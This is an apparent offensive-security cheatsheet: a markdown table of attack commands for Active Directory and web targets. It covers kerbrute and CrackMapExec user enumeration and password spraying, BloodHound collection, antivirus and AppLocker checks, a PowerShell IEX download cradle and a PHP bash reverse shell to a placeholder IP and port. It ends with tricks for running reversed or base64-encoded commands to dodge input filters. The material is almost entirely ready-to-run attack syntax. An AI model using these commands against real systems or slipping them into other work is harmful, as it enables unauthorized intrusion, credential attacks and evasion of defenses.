# Cheatsheet

| Command                                                                                                      | Description                                            |
| ------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------ |
| `fping -asgq <subnet/cidr>`                                                                                  | Quick way to ping all hosts in a subnet on kali.       |
| `./kerbrute userenum -d <Domain> --dc <dc IP> <username wordlist> -o <result output>`                        | Kerbrute userenum syntax, given a username wordlist    |
| `crackmapexec smb <IP address> -u <username> -p <password> --pass-pol`                                       | Crackmapexec with valid creds to eval password policy. |
| `rpcclient -U "" -N <IP address> rpcclient $> enumdomuser`                                                   | RPC Client NULL authentication enum domain users.      |
| `net accounts`                                                                                               | Enum password policy on Windows                        |
| `crackmapexec smb <IP address> --users`                                                                      | CrackMapExec to find users in Windows domain           |
| `kerbrute passwordspray -d <Domain> --dc <IP Address> <users.txt> <password>`                                | Kerbrute password spray                                |
| `sudo crackmapexec smb <IP Address> -u <users.txt> -p <password> \| grep +`                                  | CrackMapExec password spray                            |
| `Get-MpComputerStatus`                                                                                       | Check AntiVirus                                        |
| `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections`                                   | Check App Locker.                                      |
| `$ExecutionContext.SessionState.LanguageMode`                                                                | Find PowerShell Language Mode                          |
| `sudo crackmapexec smb <IP address> -u <username> -p <password> --users`                                     | Authenticated scan for more users.                     |
| `sudo crackmapexec smb <IP address> -u <user> -p <password> --groups`                                        | Authenticated scan for more groups.                    |
| `sudo crackmapexec smb <IP address> -u <user> -p <password> --loggedon-users`                                | Authenticated scan for logged on users.                |
| `sudo crackmapexec smb <IP address> -u <user> -p <password> --shares`                                        | Authenticated scan for shares.                         |
| `sudo crackmapexec smb <IP address> -u <user> -p <passowrd -M spider_plus --share <share>`                   | Authenticated scan to crawl target share               |
| `smbmap -u <user> -p <passowrd> -d <domain> -H <IP address>`                                                 | Authenticated scan to list shares.                     |
| `sudo bloodhound-python -u <user> -p <password> -ns <nameserver IP> -d <domain> -c all`                      | Authenticated Bloodhound all.                          |
| `"IEX(New-Object Net.WebClient).downloadString('<URL>')"`                                                    | PowerShell one-liner used to download a file.          |
| `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'");`                                         | PHP reverse shell                                      |
| `sudo python3 joomla-brute.py -u <url> -w <password list> -usr <username or user list>`                      | Joomla brute script                                    |
| **Reversed Commands**                                                                                        |                                                        |
| `echo 'whoami' \| rev`                                                                                       | Reverse a string                                       |
| `$(rev<<<'imaohw')`                                                                                          | Execute reversed command                               |
| **Encoded Commands**                                                                                         |                                                        |
| `echo -n 'cat /etc/passwd \| grep 33' \| base64`                                                             | Encode a string with base64                            |
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`                                                 | Execute b64 encoded string                             |
| **Reversed Commands**                                                                                        |                                                        |
| `"whoami"[-1..-20] -join ''`                                                                                 | Reverse a string                                       |
| `iex "$('imaohw'[-1..-20] -join '')"`                                                                        | Execute reversed command                               |
| **Encoded Commands**                                                                                         |                                                        |
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`                              | Encode a string with base64                            |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string                             |